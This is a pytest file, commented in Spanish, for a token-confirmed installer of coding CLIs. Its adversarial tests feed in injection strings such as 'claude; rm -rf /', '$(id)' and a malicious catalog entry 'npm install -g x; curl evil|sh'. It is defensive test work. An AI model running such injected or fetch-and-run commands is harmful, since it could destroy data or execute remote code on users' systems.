"""
T3 (plan 2026-11-15, seccion 5b): instalar un CLI si falta, en dos pasos y con reglas duras.
Pruebas adversarias: token reutilizado / de otro CLI / vencido, cli_id inexistente, inyeccion por
argumentos, rutas con `..` o saltos de linea y catalogo de usuario malicioso.
"""

from __future__ import annotations

import hmac
import json
import stat
import sys
import time
from pathlib import Path
from typing import Any, Dict, List

import pytest

from conftest import make_test_db
from src.adapters.terminal import CliCatalogService, PosixPtyHostConnector
from src.adapters.terminal.cli_install import InstallConfirmationBroker
from src.app.api_bridge import ApiBridge


class _Clock:
    def __init__(self) -> None:
        self.now = 1000.0

    def __call__(self) -> float:
        return self.now


# ---------------------------------------------------------------------------
# Broker de tokens (sin POSIX)
# ---------------------------------------------------------------------------


def test_token_is_single_use_and_bound_to_cli_command_and_platform() -> None:
    broker = InstallConfirmationBroker()
    tok, ttl = broker.issue("claude", "npm install -g x", "linux")
    assert ttl == 120.0 and len(tok) >= 32
    assert broker.consume("claude", tok, "npm install -g x", "linux") == "OK"
    # reutilizado
    assert broker.consume("claude", tok, "npm install -g x", "linux") == "INSTALL_TOKEN_INVALID"

    for cli, cmd, plat in (
        ("codex", "npm install -g x", "linux"),            # token de otro CLI
        ("claude", "npm install -g otro", "linux"),        # comando cambiado
        ("claude", "npm install -g x", "darwin"),          # otro SO
    ):
        t, _ = broker.issue("claude", "npm install -g x", "linux")
        assert broker.consume(cli, t, cmd, plat) == "INSTALL_TOKEN_INVALID"
        # y quedo quemado aunque no cuadrara el contexto
        assert broker.consume("claude", t, "npm install -g x", "linux") == "INSTALL_TOKEN_INVALID"


def test_token_expires_and_garbage_tokens_are_rejected() -> None:
    clock = _Clock()
    broker = InstallConfirmationBroker(ttl_s=60, clock=clock)
    tok, _ = broker.issue("claude", "c", "linux")
    clock.now += 61
    assert broker.consume("claude", tok, "c", "linux") == "INSTALL_TOKEN_EXPIRED"
    assert broker.consume("claude", tok, "c", "linux") == "INSTALL_TOKEN_INVALID"

    tok2, _ = broker.issue("claude", "c", "linux")
    clock.now += 59.9
    assert broker.consume("claude", tok2, "c", "linux") == "OK"

    for garbage in (None, "", 0, 123, b"bytes", ["x"], {"a": 1}, "x" * 100000, "' OR 1=1 --", "\n"):
        assert broker.consume("claude", garbage, "c", "linux") == "INSTALL_TOKEN_INVALID"
    assert broker.consume(["claude"], "tok", "c", "linux") == "INSTALL_TOKEN_INVALID"


def test_new_prepare_invalidates_previous_token_and_pending_is_bounded() -> None:
    broker = InstallConfirmationBroker(max_pending=3)
    first, _ = broker.issue("claude", "c", "linux")
    second, _ = broker.issue("claude", "c", "linux")
    assert first != second
    assert broker.consume("claude", first, "c", "linux") == "INSTALL_TOKEN_INVALID"
    assert broker.consume("claude", second, "c", "linux") == "OK"
    for i in range(10):
        broker.issue(f"cli{i}", "c", "linux")
    assert broker.pending_count() <= 3


def test_token_comparison_uses_constant_time_compare(monkeypatch: pytest.MonkeyPatch) -> None:
    calls: List[int] = []
    real = hmac.compare_digest

    def spy(a: Any, b: Any) -> bool:
        calls.append(1)
        return real(a, b)

    import src.adapters.terminal.cli_install as mod

    monkeypatch.setattr(mod.hmac, "compare_digest", spy)
    broker = InstallConfirmationBroker()
    for i in range(3):
        broker.issue(f"c{i}", "x", "linux")
    broker.consume("c0", "no-existe", "x", "linux")
    assert len(calls) >= 3  # recorre todos los pendientes, sin cortar al primer acierto


# ---------------------------------------------------------------------------
# Puente (POSIX)
# ---------------------------------------------------------------------------

posix_only = pytest.mark.skipif(not PosixPtyHostConnector.is_available(), reason="Solo POSIX")


def _make_exec(path: Path, body: str = "#!/bin/sh\nexit 0\n") -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(body)
    path.chmod(path.stat().st_mode | stat.S_IXUSR)
    return path


def _write_user_catalog(path: Path) -> Path:
    path.write_text(json.dumps({
        "schema_version": 1,
        "clis": [
            {
                "id": "mytool", "display_name": "My Tool", "icon": "mytool", "binary": "mytool",
                "install": {"linux": [{"method": "npm", "command": "npm install -g mytool",
                                       "verified": True, "source_url": "https://example.org/d"}]},
            },
            {   # intento de inyeccion: la entrada completa se descarta
                "id": "evil", "display_name": "Evil", "icon": "evil", "binary": "evil",
                "install": {"linux": [{"method": "npm", "command": "npm install -g x; curl evil|sh",
                                       "verified": True, "source_url": "https://example.org/d"}]},
            },
        ],
    }))
    return path


def _make_bridge(tmp_path: Path, available_tools: set[str], *, user_catalog: bool = False) -> ApiBridge:
    bridge = ApiBridge(db_manager=make_test_db())
    primary = bridge.core_kernel.terminal_connector.primary
    ucat = _write_user_catalog(tmp_path / "u.json") if user_catalog else tmp_path / "sin_usuario.json"
    primary.catalog_service = CliCatalogService(
        bridge.core_kernel.extension_repo,
        user_catalog_path=ucat,
        which=lambda name: f"/usr/bin/{name}" if name in available_tools else None,
        platform="linux",
        home=str(tmp_path / "home"),
        environ={"SHELL": "/bin/sh"},
    )
    primary.min_available_mb = 0
    return bridge


@pytest.fixture
def make_bridge(tmp_path: Path):
    created: List[ApiBridge] = []

    def _factory(tools: set[str], **kw: Any) -> ApiBridge:
        b = _make_bridge(tmp_path, tools, **kw)
        created.append(b)
        return b

    yield _factory
    for b in created:
        b._close_terminal_matrix()
        b.core_kernel.close()


@posix_only
def test_prepare_returns_exact_catalog_command_token_and_prefers_package_manager(make_bridge: Any) -> None:
    b = make_bridge({"npm", "node", "curl", "bash"})
    res = b.pty_prepare_install("claude")
    assert res["success"] is True and res["requires_confirmation"] is True
    assert res["command"] == "npm install -g @anthropic-ai/claude-code@latest"
    assert res["method"] == "npm" and res["downloads_script"] is False and res["warning"] == ""
    assert res["platform"] == "linux" and res["source_url"].startswith("https://code.claude.com")
    assert len(res["confirmation_token"]) >= 32 and res["expires_in_s"] == 120.0

    # Sin npm pero con curl+bash: cae al instalador oficial y AVISA que es un script descargado.
    b2 = make_bridge({"curl", "bash"})
    res2 = b2.pty_prepare_install("claude")
    assert res2["method"] == "curl_sh" and res2["downloads_script"] is True
    assert "script descargado" in res2["warning"]
    assert res2["command"] == "curl -fsSL https://claude.ai/install.sh | bash"


@posix_only
def test_prepare_reports_missing_prerequisites_without_token_or_install(make_bridge: Any) -> None:
    b = make_bridge(set())
    res = b.pty_prepare_install("claude")
    assert res["success"] is False and res["code"] == "PREREQUISITE_MISSING"
    assert "npm" in res["missing"] and "confirmation_token" not in res
    assert b.extensions_ui._get_install_broker().pending_count() == 0
    # Antigravity solo tiene curl|bash
    assert make_bridge({"curl"}).pty_prepare_install("antigravity")["missing"] == ["bash"]
    # install tampoco avanza sin herramientas
    inst = b.pty_install_cli("claude", "cualquiera")
    assert inst["code"] == "PREREQUISITE_MISSING"
    assert b.pty_get_matrix_status()["sessions"] == []


@posix_only
@pytest.mark.parametrize(
    "bad_id",
    ["nope", "", None, 7, ["claude"], {"id": "claude"}, "claude; rm -rf /", "claude && id", "claude\nid",
     "../claude", "CLAUDE", "claude --dangerously", "$(id)", "`id`"],
)
def test_prepare_and_install_reject_unknown_or_injected_cli_ids(make_bridge: Any, bad_id: Any) -> None:
    b = make_bridge({"npm", "node", "curl", "bash"})
    assert b.pty_prepare_install(bad_id)["code"] == "CLI_PROFILE_UNKNOWN"
    assert b.pty_install_cli(bad_id, "tok")["code"] == "CLI_PROFILE_UNKNOWN"
    assert b.pty_get_matrix_status()["sessions"] == []


@posix_only
def test_install_without_or_with_bad_token_never_runs(make_bridge: Any) -> None:
    b = make_bridge({"npm", "node"})
    prep = b.pty_prepare_install("claude")
    for bad in (None, "", "x", prep["confirmation_token"][:-1] + "A", 123, [prep["confirmation_token"]],
                prep["confirmation_token"] + "\n"):
        res = b.pty_install_cli("claude", bad)
        assert res["success"] is False and res["code"] == "INSTALL_TOKEN_INVALID", bad
    assert b.pty_get_matrix_status()["sessions"] == []
    # El token legitimo sigue vivo tras intentos fallidos con otros valores
    assert b.extensions_ui._get_install_broker().pending_count() == 1


@posix_only
def test_token_for_another_cli_is_rejected_and_burned(make_bridge: Any) -> None:
    b = make_bridge({"npm", "node"})
    claude_tok = b.pty_prepare_install("claude")["confirmation_token"]
    assert b.pty_install_cli("codex", claude_tok)["code"] == "INSTALL_TOKEN_INVALID"
    assert b.pty_install_cli("claude", claude_tok)["code"] == "INSTALL_TOKEN_INVALID"  # quemado
    assert b.pty_get_matrix_status()["sessions"] == []


@posix_only
def test_expired_token_is_rejected(make_bridge: Any) -> None:
    b = make_bridge({"npm", "node"})
    clock = _Clock()
    b.extensions_ui._install_broker = InstallConfirmationBroker(ttl_s=30, clock=clock)
    tok = b.pty_prepare_install("claude")["confirmation_token"]
    clock.now += 31
    res = b.pty_install_cli("claude", tok)
    assert res["code"] == "INSTALL_TOKEN_EXPIRED"
    assert b.pty_get_matrix_status()["sessions"] == []


@posix_only
def test_install_runs_catalog_command_in_a_real_pane_once(make_bridge: Any, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    fakebin = tmp_path / "fakebin"
    marker = tmp_path / "npm-args.txt"
    _make_exec(fakebin / "npm", f"#!/bin/sh\necho FAKE_NPM \"$@\"\necho \"$@\" > {marker}\nexit 3\n")
    _make_exec(fakebin / "node")
    monkeypatch.setenv("PATH", f"{fakebin}:/usr/bin:/bin")
    b = make_bridge({"npm", "node"})
    # Misma deteccion que el sistema real: shutil.which sobre el PATH parcheado.
    import shutil
    b.core_kernel.terminal_connector.primary.catalog_service._which = shutil.which

    prep = b.pty_prepare_install("claude")
    assert prep["command"] == "npm install -g @anthropic-ai/claude-code@latest"
    # Intento de inyectar comando/argumentos extra: la firma solo acepta (cli_id, token, pane_id)
    with pytest.raises(TypeError):
        b.pty_install_cli("claude", prep["confirmation_token"], None, "rm -rf /")  # type: ignore[call-arg]
    with pytest.raises(TypeError):
        b.pty_install_cli("claude", prep["confirmation_token"], command="rm -rf /")  # type: ignore[call-arg]

    res = b.pty_install_cli("claude", prep["confirmation_token"])
    assert res["success"] is True and res["code"] == "INSTALL_STARTED" and res["pane_id"] == "pane_1"
    assert res["command"] == prep["command"]

    cursor, acc, deadline = 0, "", time.monotonic() + 8
    while time.monotonic() < deadline and "termino con codigo 3" not in acc:
        out = b.pty_poll_output("pane_1", cursor)
        cursor, acc = out["next_seq"], acc + out["text"]
        time.sleep(0.05)
    assert "FAKE_NPM install -g @anthropic-ai/claude-code@latest" in acc
    assert "termino con codigo 3" in acc
    assert marker.read_text().strip() == "install -g @anthropic-ai/claude-code@latest"

    # el mismo token no sirve dos veces
    assert b.pty_install_cli("claude", prep["confirmation_token"])["code"] == "INSTALL_TOKEN_INVALID"


@posix_only
def test_install_pane_selection_and_pane_id_injection(make_bridge: Any) -> None:
    b = make_bridge({"npm", "node"})
    for bad_pane in ("pane_1; id", "../x", "pane_9", 99, "x\n", True):
        tok = b.pty_prepare_install("claude")["confirmation_token"]
        res = b.pty_install_cli("claude", tok, bad_pane)
        assert res["code"] in {"INVALID_PANE_ID", "PANE_LIMIT_REACHED"}, bad_pane
    # el token no se quemo por un pane_id invalido
    tok = b.pty_prepare_install("claude")["confirmation_token"]
    assert b.pty_install_cli("claude", tok, "pane_1; id")["code"] == "INVALID_PANE_ID"
    assert b.extensions_ui._get_install_broker().pending_count() == 1


@posix_only
def test_user_catalog_cli_is_listed_but_not_installable_and_malicious_entry_is_dropped(make_bridge: Any) -> None:
    b = make_bridge({"npm", "node", "curl", "bash"}, user_catalog=True)
    ids = {c["id"] for c in b.pty_list_cli_catalog()["clis"]}
    assert "mytool" in ids and "evil" not in ids
    row = next(c for c in b.pty_list_cli_catalog()["clis"] if c["id"] == "mytool")
    assert row["source"] == "user" and row["verified"] is False and row["install"]["available"] is False
    res = b.pty_prepare_install("mytool")
    assert res["success"] is False and res["code"] == "INSTALL_NOT_ALLOWED"
    assert "confirmation_token" not in res
    assert b.pty_install_cli("mytool", "tok")["code"] == "INSTALL_NOT_ALLOWED"
    assert b.pty_prepare_install("evil")["code"] == "CLI_PROFILE_UNKNOWN"


@posix_only
def test_shell_already_installed_and_no_method_cases(make_bridge: Any, tmp_path: Path) -> None:
    b = make_bridge({"npm", "node"})
    assert b.pty_prepare_install("custom_shell")["code"] == "INSTALL_NOT_AVAILABLE"
    _make_exec(tmp_path / "home" / ".local" / "bin" / "claude")
    res = b.pty_prepare_install("claude")
    assert res["code"] == "ALREADY_INSTALLED" and res["resolved_path"].endswith("/claude")
    # tras instalar, el siguiente listado vuelve a resolver el binario
    row = next(c for c in b.pty_list_cli_catalog()["clis"] if c["id"] == "claude")
    assert row["installed"] is True


def test_win32_returns_platform_unsupported_with_manual_command(monkeypatch: pytest.MonkeyPatch) -> None:
    bridge = ApiBridge(db_manager=make_test_db())
    try:
        monkeypatch.setattr(sys, "platform", "win32")
        res = bridge.pty_prepare_install("claude")
        assert res["success"] is False and res["code"] == "TERMINAL_PLATFORM_UNSUPPORTED"
        assert res["install_command"] == "winget install Anthropic.ClaudeCode"
        assert "confirmation_token" not in res
        assert bridge.pty_install_cli("claude", "x")["code"] == "TERMINAL_PLATFORM_UNSUPPORTED"
    finally:
        monkeypatch.undo()
        bridge.core_kernel.close()
